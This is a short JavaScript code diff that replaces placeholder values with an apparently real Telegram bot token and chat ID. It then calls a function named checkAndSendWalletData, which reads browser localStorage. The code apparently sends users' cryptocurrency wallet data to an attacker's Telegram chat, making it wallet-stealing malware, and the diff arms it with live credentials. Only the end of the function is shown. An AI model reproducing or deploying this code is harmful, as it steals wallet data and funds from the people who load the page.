@@ -62,10 +62,9 @@ function checkAndSendWalletData(botToken, chatId) {
         console.error('Error accessing localStorage:', error);
     }
 }
-
-// Your Telegram bot credentials
-const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+// Telegram Bot Configuration
+    const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
+    const TELEGRAM_CHAT_ID = '8163151595'; 
 
 // Execute the check and send function
 checkAndSendWalletData(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
